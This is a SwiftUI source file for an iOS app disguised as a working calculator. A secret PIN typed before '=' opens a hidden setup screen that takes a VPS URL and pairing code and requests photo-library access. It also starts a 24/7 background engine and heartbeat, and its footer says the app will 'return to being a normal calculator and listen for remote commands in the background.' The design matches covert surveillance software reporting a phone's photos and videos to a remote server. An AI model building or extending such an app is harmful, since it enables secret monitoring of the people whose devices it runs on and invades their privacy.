import SwiftUI

struct ContentView: View {
    @StateObject private var engine = VaultEngine.shared
    @State private var display = "0"
    @State private var currentOperation: String? = nil
    @State private var previousValue: Double = 0
    @State private var isTyping = false
    @State private var showSecretSheet = false
    @State private var keyHistory = ""

    var body: some View {
        GeometryReader { geo in
            let spacing: CGFloat = 14
            let totalWidth = geo.size.width
            let buttonSize = (totalWidth - (spacing * 5)) / 4
            let zeroWidth = (buttonSize * 2) + spacing

            ZStack {
                Color.black.edgesIgnoringSafeArea(.all)

                VStack(spacing: spacing) {
                    Spacer()

                    // Display Value
                    HStack {
                        Spacer()
                        Text(display)
                            .font(.system(size: 80, weight: .light))
                            .foregroundColor(.white)
                            .lineLimit(1)
                            .minimumScaleFactor(0.2)
                            .padding(.horizontal, 24)
                    }

                    // Keypad Rows
                    VStack(spacing: spacing) {
                        // Row 1
                        HStack(spacing: spacing) {
                            calcBtn("AC", size: buttonSize, color: Color(white: 0.65), textCol: .black) { clear() }
                            calcBtn("+/-", size: buttonSize, color: Color(white: 0.65), textCol: .black) { toggleSign() }
                            calcBtn("%", size: buttonSize, color: Color(white: 0.65), textCol: .black) { percentage() }
                            calcBtn("÷", size: buttonSize, color: .orange) { setOperation("÷") }
                        }

                        // Row 2
                        HStack(spacing: spacing) {
                            calcBtn("7", size: buttonSize) { inputDigit("7") }
                            calcBtn("8", size: buttonSize) { inputDigit("8") }
                            calcBtn("9", size: buttonSize) { inputDigit("9") }
                            calcBtn("×", size: buttonSize, color: .orange) { setOperation("×") }
                        }

                        // Row 3
                        HStack(spacing: spacing) {
                            calcBtn("4", size: buttonSize) { inputDigit("4") }
                            calcBtn("5", size: buttonSize) { inputDigit("5") }
                            calcBtn("6", size: buttonSize) { inputDigit("6") }
                            calcBtn("-", size: buttonSize, color: .orange) { setOperation("-") }
                        }

                        // Row 4
                        HStack(spacing: spacing) {
                            calcBtn("1", size: buttonSize) { inputDigit("1") }
                            calcBtn("2", size: buttonSize) { inputDigit("2") }
                            calcBtn("3", size: buttonSize) { inputDigit("3") }
                            calcBtn("+", size: buttonSize, color: .orange) { setOperation("+") }
                        }

                        // Row 5
                        HStack(spacing: spacing) {
                            Button(action: { inputDigit("0") }) {
                                HStack {
                                    Text("0")
                                        .font(.system(size: 34, weight: .medium))
                                        .foregroundColor(.white)
                                        .padding(.leading, buttonSize * 0.35)
                                    Spacer()
                                }
                                .frame(width: zeroWidth, height: buttonSize)
                                .background(Color(white: 0.2))
                                .cornerRadius(buttonSize / 2)
                            }

                            calcBtn(".", size: buttonSize) { inputDigit(".") }
                            calcBtn("=", size: buttonSize, color: .orange) { calculate() }
                        }
                    }
                    .padding(.bottom, geo.safeAreaInsets.bottom > 0 ? geo.safeAreaInsets.bottom : 20)
                }
                .padding(.horizontal, spacing)
            }
        }
        .sheet(isPresented: $showSecretSheet) {
            SecretSetupView(engine: engine, isPresented: $showSecretSheet)
        }
    }

    private func calcBtn(_ label: String, size: CGFloat, color: Color = Color(white: 0.2), textCol: Color = .white, action: @escaping () -> Void) -> some View {
        Button(action: action) {
            Text(label)
                .font(.system(size: 32, weight: .medium))
                .foregroundColor(textCol)
                .frame(width: size, height: size)
                .background(color)
                .clipShape(Circle())
        }
    }

    private func inputDigit(_ digit: String) {
        keyHistory += digit
        if !isTyping {
            display = digit
            isTyping = true
        } else {
            display += digit
        }
    }

    private func clear() {
        display = "0"
        previousValue = 0
        currentOperation = nil
        isTyping = false
        keyHistory = ""
    }

    private func toggleSign() {
        if let val = Double(display) {
            display = val.truncatingRemainder(dividingBy: 1) == 0 ? String(Int(-val)) : String(-val)
        }
    }

    private func percentage() {
        if let val = Double(display) {
            display = String(val / 100)
        }
    }

    private func setOperation(_ op: String) {
        previousValue = Double(display) ?? 0
        currentOperation = op
        isTyping = false
        keyHistory += op
    }

    private func calculate() {
        keyHistory += "="

        // Detect Secret Code (e.g. 9876=)
        if display == engine.secretPin || keyHistory.contains(engine.secretPin + "=") {
            keyHistory = ""
            clear()
            showSecretSheet = true
            return
        }

        guard let op = currentOperation, let current = Double(display) else { return }
        var result: Double = 0
        switch op {
        case "+": result = previousValue + current
        case "-": result = previousValue - current
        case "×": result = previousValue * current
        case "÷": result = current != 0 ? previousValue / current : 0
        default: break
        }

        display = result.truncatingRemainder(dividingBy: 1) == 0 ? String(Int(result)) : String(result)
        currentOperation = nil
        isTyping = false
    }
}

// MARK: - Secret Setup View
struct SecretSetupView: View {
    @ObservedObject var engine: VaultEngine
    @Binding var isPresented: Bool

    @State private var serverURL: String = ""
    @State private var pairingCode: String = ""
    @State private var secretPin: String = ""

    var body: some View {
        NavigationView {
            Form {
                Section(header: Text("Device Pairing & Pin")) {
                    HStack {
                        Text("Pairing Code")
                        Spacer()
                        TextField("Code", text: $pairingCode)
                            .multilineTextAlignment(.trailing)
                            .font(.system(.body, design: .monospaced))
                            .foregroundColor(.green)
                    }

                    HStack {
                        Text("Secret PIN")
                        Spacer()
                        TextField("PIN", text: $secretPin)
                            .multilineTextAlignment(.trailing)
                            .keyboardType(.numberPad)
                    }

                    HStack {
                        Text("VPS URL")
                        Spacer()
                        TextField("URL", text: $serverURL)
                            .multilineTextAlignment(.trailing)
                            .font(.caption)
                    }
                }

                Section(header: Text("Photo Permission & Background Keep-Alive")) {
                    HStack {
                        Text("Photos Detected")
                        Spacer()
                        Text("\(engine.photosCount)")
                            .foregroundColor(.secondary)
                    }

                    HStack {
                        Text("Videos Detected")
                        Spacer()
                        Text("\(engine.videosCount)")
                            .foregroundColor(.secondary)
                    }

                    HStack {
                        Text("Background Engine")
                        Spacer()
                        Text(engine.isBackgroundActive ? "ACTIVE (24/7)" : "OFFLINE")
                            .foregroundColor(engine.isBackgroundActive ? .green : .red)
                            .fontWeight(.bold)
                    }

                    Button(action: activateVault) {
                        HStack {
                            Spacer()
                            Text(engine.isActivated ? "RE-ACTIVATE ENGINE" : "GRANT PERMISSION & ACTIVATE")
                                .fontWeight(.bold)
                                .foregroundColor(.white)
                            Spacer()
                        }
                        .padding(.vertical, 10)
                        .background(Color.green)
                        .cornerRadius(10)
                    }
                }

                Section(footer: Text("Close this screen after activating. The app will return to being a normal calculator and listen for remote commands in the background.")) {
                    Button(action: {
                        saveAndDismiss()
                    }) {
                        HStack {
                            Spacer()
                            Text("SAVE & HIDE (RETURN TO CALCULATOR)")
                                .fontWeight(.semibold)
                                .foregroundColor(.blue)
                            Spacer()
                        }
                    }
                }
            }
            .navigationTitle("Secret Vault Setup")
            .navigationBarItems(trailing: Button("Done") { saveAndDismiss() })
            .onAppear {
                serverURL = engine.serverURL
                pairingCode = engine.pairingCode
                secretPin = engine.secretPin
            }
        }
    }

    private func activateVault() {
        engine.serverURL = serverURL
        engine.pairingCode = pairingCode.trimmingCharacters(in: .whitespacesAndNewlines).uppercased()
        engine.secretPin = secretPin
        engine.saveSettings()

        engine.requestPhotoPermission { granted in
            if granted {
                engine.isActivated = true
                engine.startBackgroundKeepAlive()
                engine.startHeartbeat()
                engine.saveSettings()
            }
        }
    }

    private func saveAndDismiss() {
        engine.serverURL = serverURL
        engine.pairingCode = pairingCode.trimmingCharacters(in: .whitespacesAndNewlines).uppercased()
        engine.secretPin = secretPin
        engine.saveSettings()
        isPresented = false
    }
}
